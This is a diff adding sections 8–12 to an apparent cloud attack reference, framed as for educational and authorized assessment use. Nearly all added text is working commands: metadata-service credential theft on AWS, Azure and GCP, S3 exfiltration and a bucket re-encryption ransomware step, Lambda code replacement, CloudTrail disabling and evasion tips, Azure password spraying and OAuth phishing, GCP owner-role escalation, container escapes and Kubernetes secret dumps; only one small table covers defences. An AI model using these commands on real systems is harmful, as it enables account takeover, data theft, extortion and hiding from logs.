@@ -290,4 +290,229 @@ Full matrix: [attack.mitre.org/matrices/enterprise/cloud/](https://attack.mitre.
 
 ---
 
+---
+
+## 8. AWS Attack Techniques Deep Dive
+
+### EC2 SSRF to IMDS Credential Theft
+
+```bash
+# Classic SSRF to AWS IMDS (v1 — no session token required)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+
+# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
+# Use these credentials from attacker machine:
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+
+# IMDSv2 mitigation (requires session token):
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+### IAM Enumeration Without CloudTrail Noise
+
+```bash
+# Enumerate without triggering obvious API calls
+aws iam get-account-authorization-details --filter User Group Role LocalManagedPolicy AWSManagedPolicy
+
+# Pacu automated enumeration
+python3 pacu.py
+# > import_keys PROFILE
+# > run iam__enum_permissions
+# > run iam__privesc_scan
+```
+
+### Lambda Function Exploitation
+
+```bash
+# Enumerate lambdas
+aws lambda list-functions
+aws lambda get-function --function-name TARGET --query 'Code.Location'
+
+# Download and inspect code for secrets
+curl -o function.zip "$(aws lambda get-function --function-name TARGET --query Code.Location --output text)"
+
+# Invoke lambda with event payload
+aws lambda invoke --function-name TARGET --payload '{"key":"value"}' output.json
+
+# Update function code (if write permissions exist)
+aws lambda update-function-code --function-name TARGET --zip-file fileb://evil.zip
+```
+
+### S3 Bucket Attacks
+
+```bash
+# Find public buckets
+aws s3 ls s3://BUCKET --no-sign-request
+aws s3 cp s3://BUCKET/sensitive.txt . --no-sign-request
+
+# Enumerate with credentials
+aws s3api list-buckets
+aws s3api get-bucket-acl --bucket BUCKET
+aws s3api get-bucket-policy --bucket BUCKET
+
+# Exfil data
+aws s3 sync s3://victim-bucket/ /tmp/loot/
+
+# S3 ransomware: delete default encryption, re-encrypt with attacker key
+aws s3api put-bucket-encryption --bucket BUCKET \
+  --server-side-encryption-configuration \
+  '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"aws:kms","KMSMasterKeyID":"ATTACKER_KMS_KEY"}}]}'
+```
+
+### CloudTrail Evasion
+
+```bash
+# Check logging status
+aws cloudtrail get-trail-status --name TRAIL_NAME
+aws cloudtrail get-event-selectors --trail-name TRAIL_NAME
+
+# Disable trail (requires cloudtrail:StopLogging)
+aws cloudtrail stop-logging --name TRAIL_NAME
+aws cloudtrail delete-trail --name TRAIL_NAME
+
+# Low-noise techniques:
+# - Use ListBuckets (not logged in older configs)
+# - Use EC2 userdata execution (metadata only logs IAM calls, not executed commands)
+# - Use existing long-lived sessions to avoid login events
+# - Use services without fine-grained CloudTrail logging (some SES, SQS operations)
+```
+
+### AWS Defensive Controls
+
+| Control | Service | Implementation |
+|---|---|---|
+| Enforce IMDSv2 | EC2 | `aws ec2 modify-instance-metadata-options --http-tokens required` |
+| Block public S3 | S3 | Account-level Block Public Access setting |
+| Enable CloudTrail | CloudTrail | Multi-region trail + S3 + CloudWatch integration |
+| Enable GuardDuty | GuardDuty | `aws guardduty create-detector --enable` |
+| SCPs for guardrails | Organizations | Deny cloudtrail:StopLogging, Deny root usage |
+| Access Analyzer | IAM | Identify resources shared outside account |
+| Config Rules | Config | Detect misconfigurations continuously |
+
+---
+
+## 9. Azure Attack Techniques Deep Dive
+
+### Azure AD / Entra ID Attacks
+
+```powershell
+# Password spray against Azure AD (use low-and-slow to avoid lockout)
+Invoke-MSOLSpray -UserList users.txt -Password Winter2024! -Delay 30
+
+# OAuth device code phishing
+# Send link to victim: https://microsoft.com/devicelogin with attacker-controlled code
+# Victim authenticates -> attacker gets access token
+
+# Consent phishing: malicious OAuth app requests high-privilege scopes
+# Target scopes: Application.ReadWrite.All, Mail.Read, Files.ReadWrite.All
+
+# Pass-the-PRT (Primary Refresh Token) — extract from Windows device using AADInternals
+Import-Module AADInternals
+$PRT = Get-AADIntUserPRTToken
+# Use PRT to get access tokens for any resource
+```
+
+### Azure Resource Manager Attacks
+
+```bash
+# Enumerate all resources (Contributor or higher)
+az resource list --output table
+az vm list-ip-addresses
+
+# Managed Identity abuse — from inside Azure VM
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
+
+# Runbook credential theft — read credentials stored in automation accounts
+az automation credential list --automation-account-name NAME --resource-group RG
+
+# Key Vault access
+az keyvault list
+az keyvault secret list --vault-name VAULT
+az keyvault secret show --vault-name VAULT --name SECRET
+```
+
+---
+
+## 10. GCP Attack Techniques Deep Dive
+
+```bash
+# Check current identity and permissions
+gcloud auth list
+gcloud projects get-iam-policy PROJECT_ID
+
+# Service account key theft from metadata
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+
+# Enumerate project resources
+gcloud compute instances list
+gcloud storage ls
+gcloud functions list
+
+# IAM privilege escalation paths
+# roles/iam.serviceAccountTokenCreator -> impersonate any SA
+gcloud iam service-accounts get-iam-policy SA_EMAIL
+
+# roles/editor -> create new SA with roles/owner, generate key
+gcloud iam service-accounts create evil-sa
+gcloud projects add-iam-policy-binding PROJECT \
+  --member="serviceAccount:evil-sa@PROJECT.iam.gserviceaccount.com" \
+  --role="roles/owner"
+gcloud iam service-accounts keys create key.json \
+  --iam-account=evil-sa@PROJECT.iam.gserviceaccount.com
+```
+
+---
+
+## 11. Container Escape Reference
+
+| Technique | Condition | Commands |
+|---|---|---|
+| Privileged container | `--privileged` flag | `fdisk -l; mount /dev/sda1 /mnt; chroot /mnt sh` |
+| Host PID namespace | `--pid=host` | `nsenter --target 1 --mount --uts --ipc --net --pid -- bash` |
+| Docker socket mount | `/var/run/docker.sock` mounted | `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh` |
+| Writable hostPath | Mounted host directory writable | Write cron job or SSH authorized_keys to host path |
+| CAP_SYS_ADMIN | Capability granted | Mount filesystem, load kernel modules, many escape paths |
+| Kubernetes etcd | Network access to etcd port 2379 | `etcdctl get / --prefix --keys-only` — all secrets unencrypted |
+
+---
+
+## 12. Kubernetes Attack Paths
+
+```bash
+# Unauthenticated API server (port 8080, rare but exists)
+curl http://K8S_API:8080/api/v1/namespaces/default/pods
+
+# Service account token abuse (steal from pod)
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+kubectl --token=$TOKEN --insecure-skip-tls-verify=true \
+  -s https://kubernetes.default.svc get pods -A
+
+# RBAC escalation: if SA has create Pods permission, create privileged pod mounting host
+# apiVersion: v1
+# kind: Pod
+# spec:
+#   hostPID: true
+#   containers:
+#   - name: attacker
+#     image: alpine
+#     command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","bash"]
+#     securityContext:
+#       privileged: true
+
+# Etcd backup exfil
+ETCDCTL_API=3 etcdctl \
+  --endpoints=https://127.0.0.1:2379 \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
+  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
+  get /registry/secrets/default/my-secret
+```
+
+
+---
 *Reference built for educational and authorized security assessment use. Always obtain written authorization before testing cloud environments.*
